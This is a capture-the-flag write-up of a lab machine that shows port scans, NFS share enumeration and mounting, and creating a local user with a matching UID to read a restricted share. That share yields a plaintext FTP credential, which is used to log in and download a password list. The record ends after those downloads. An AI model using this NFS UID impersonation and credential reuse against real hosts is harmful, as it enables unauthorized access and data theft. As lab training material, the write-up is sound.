[[Writeup]]


```
┌──(dd0x㉿kali)-[~]
└─$ nmap -p- --min-rate 10000 10.10.71.31  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-04 02:42 EDT
Nmap scan report for 10.10.71.31
Host is up (0.27s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
33045/tcp open  unknown
40569/tcp open  unknown
45454/tcp open  unknown
51858/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 10.88 seconds
```

```
┌──(dd0x㉿kali)-[~]
└─$ nmap -p 21,22,80,111,2049,33045,40569,45454,51858 -sCV 10.10.71.31
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-04 02:44 EDT
Nmap scan report for 10.10.71.31
Host is up (0.26s latency).

PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
|_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
80/tcp    open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      40569/tcp   mountd
|   100005  1,2,3      42623/tcp6  mountd
|   100005  1,2,3      45253/udp6  mountd
|   100005  1,2,3      59586/udp   mountd
|   100021  1,3,4      38485/tcp6  nlockmgr
|   100021  1,3,4      38613/udp   nlockmgr
|   100021  1,3,4      39942/udp6  nlockmgr
|   100021  1,3,4      45454/tcp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs      2-4 (RPC #100003)
33045/tcp open  mountd   1-3 (RPC #100005)
40569/tcp open  mountd   1-3 (RPC #100005)
45454/tcp open  nlockmgr 1-4 (RPC #100021)
51858/tcp open  mountd   1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.27 seconds
```

Finidnigs
I saw port 80 there is no vulnerabilities that i found but i tried the mountd i find this command and it is interesting
```
┌──(dd0x㉿kali)-[~/mnt]
└─$ showmount -e 10.10.71.31                            
Export list for 10.10.71.31:
/mnt/share *
```
the `/mnt/share *` can mounted to the local machine

so i created a dir `/mnt` and mount it there
```
mkdir mnt

sudo mount -t nfs 10.10.71.31:/mnt/share hijack
```

as checking the file i cannot change directory so to check the permission i used `ls -l` to thee the permissions
```
┌──(dd0x㉿kali)-[~/mnt]
└─$ ls -la 
total 12
drwxrwxr-x  3 dd0x dd0x 4096 May  4 03:11 .
drwx---r-x 25 dd0x dd0x 4096 May  4 03:10 ..
drwx------  2 1003 1003 4096 Aug  8  2023 hijack
```

now you can see that `1003` in required to acces the file so i will create an account of UID of 1003

```
sudo useradd fake
```

```
sudo usermod -u 1003 fake
```

Now lets switch to root and switch user to the new impersonated user
```
sudo su

su fake
```

![[Pasted image 20250504152139.png]]

and this the findings what we got
```
USERNAME: ftpuser
PASSWORD: W3stV1rg1n14M0un741nM4m4
```

this might be a clue to get to the ftp server

```
┌──(dd0x㉿kali)-[~]
└─$ ftp 10.10.71.31                                                                        
Connected to 10.10.71.31.
220 (vsFTPd 3.0.3)
Name (10.10.71.31:dd0x): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -l
229 Entering Extended Passive Mode (|||27044|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls
229 Entering Extended Passive Mode (|||53814|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||61364|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 .
drwxr-xr-x    2 1002     1002         4096 Aug 08  2023 ..
-rwxr-xr-x    1 1002     1002          220 Aug 08  2023 .bash_logout
-rwxr-xr-x    1 1002     1002         3771 Aug 08  2023 .bashrc
-rw-r--r--    1 1002     1002          368 Aug 08  2023 .from_admin.txt
-rw-r--r--    1 1002     1002         3150 Aug 08  2023 .passwords_list.txt
-rwxr-xr-x    1 1002     1002          655 Aug 08  2023 .profile
226 Directory send OK.
```
now there are multiple txt files to check and i will download the files

```
ftp> mget .*
mget .bash_logout [anpqy?]? Y
229 Entering Extended Passive Mode (|||7770|)
150 Opening BINARY mode data connection for .bash_logout (220 bytes).
100% |************************************************|   220      481.71 KiB/s    00:00 ETA
226 Transfer complete.
220 bytes received in 00:00 (0.81 KiB/s)
mget .bashrc [anpqy?]? Y
229 Entering Extended Passive Mode (|||47317|)
150 Opening BINARY mode data connection for .bashrc (3771 bytes).
100% |************************************************|  3771       55.46 KiB/s    00:00 ETA
226 Transfer complete.
3771 bytes received in 00:00 (11.22 KiB/s)
mget .from_admin.txt [anpqy?]? Y
229 Entering Extended Passive Mode (|||34849|)
150 Opening BINARY mode data connection for .from_admin.txt (368 bytes).
100% |************************************************|   368        5.65 KiB/s    00:00 ETA
226 Transfer complete.
368 bytes received in 00:00 (1.10 KiB/s)
mget .passwords_list.txt [anpqy?]? Y
229 Entering Extended Passive Mode (|||54283|)
150 Opening BINARY mode data connection for .passwords_list.txt (3150 bytes).
100% |************************************************|  3150       17.88 MiB/s    00:00 ETA
226 Transfer complete.
3150 bytes received in 00:00 (11.60 KiB/s)
mget .profile [anpqy?]? Y
229 Entering Extended Passive Mode (|||11808|)
150 Opening BINARY mode data connection for .profile (655 bytes).
100% |************************************************|   655        2.73 MiB/s    00:00 ETA
226 Transfer complete.
655 bytes received in 00:00 (2.43 KiB/s)
```

